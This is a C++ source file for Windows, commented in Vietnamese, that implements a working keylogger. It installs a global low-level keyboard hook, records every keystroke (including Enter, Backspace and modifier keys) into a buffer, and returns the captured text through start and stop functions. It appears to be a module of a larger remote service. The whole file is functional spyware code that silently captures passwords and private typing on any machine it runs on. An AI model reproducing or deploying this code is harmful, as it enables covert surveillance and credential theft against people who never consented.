#include "../../lib/service.h"
#include <windows.h>
#include <string>
#include <mutex>
#include <thread>
#include <vector>
#include <sstream>
#include <map>

static std::vector<std::string> key_logs;
static std::mutex log_mutex;
static HHOOK keyboardHook = nullptr;
static std::thread hookThread;
static DWORD hookThreadId = 0;  // Lưu thread ID riêng
static bool running = false;

// Ánh xạ phím đặc biệt thành tên dễ đọc
std::string get_key_name(DWORD vkCode) {
    std::map<DWORD, std::string> specialKeys = {
        {VK_RETURN, "[ENTER]"}, {VK_BACK, "[BACKSPACE]"}, {VK_SPACE, " "},
        {VK_SHIFT, "[SHIFT]"}, {VK_LSHIFT, "[LSHIFT]"}, {VK_RSHIFT, "[RSHIFT]"},
        {VK_CONTROL, "[CTRL]"}, {VK_MENU, "[ALT]"}, {VK_TAB, "[TAB]"},
        {VK_ESCAPE, "[ESC]"}, {VK_CAPITAL, "[CAPSLOCK]"},
        {VK_LEFT, "[LEFT]"}, {VK_RIGHT, "[RIGHT]"}, {VK_UP, "[UP]"}, {VK_DOWN, "[DOWN]"}
    };

    if (specialKeys.count(vkCode)) {
        return specialKeys[vkCode];
    }

    // Nếu là chữ cái hoặc số thì chuyển về ký tự
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    WCHAR buffer[5];
    if (ToUnicode(vkCode, 0, keyboardState, buffer, 4, 0) > 0) {
        return std::string(buffer, buffer + 1);
    }

    // Nếu không rõ thì ghi mã VK
    std::ostringstream oss;
    oss << "[" << vkCode << "]";
    return oss.str();
}

// Hook xử lý bàn phím
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        std::string key = get_key_name(pKey->vkCode);

        std::lock_guard<std::mutex> lock(log_mutex);
        key_logs.push_back(key);
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

// Thread hook
void HookThreadFunc() {
    hookThreadId = GetCurrentThreadId();
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, nullptr, 0);

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        if (!running) break;
    }

    UnhookWindowsHookEx(keyboardHook);
}

// Bắt đầu keylogger
void start_keylogger() {
    std::lock_guard<std::mutex> lock(log_mutex);
    if (running) return;

    key_logs.clear();
    running = true;
    hookThread = std::thread(HookThreadFunc);
}

// Dừng keylogger và trả về log
std::string stop_keylogger() {
    {
        std::lock_guard<std::mutex> lock(log_mutex);
        if (!running) return "No keylogger running.";
        running = false;
    }

    // Gửi tín hiệu kết thúc cho thread hook
    if (hookThreadId != 0) {
        PostThreadMessage(hookThreadId, WM_QUIT, 0, 0);
    }

    if (hookThread.joinable()) {
        hookThread.join();
    }

    std::lock_guard<std::mutex> lock(log_mutex);
    if (key_logs.empty()) {
        return "No key pressed.";
    }

    std::ostringstream oss;
    for (const auto& key : key_logs) {
        oss << key;
    }

    key_logs.clear();
    return oss.str();
}
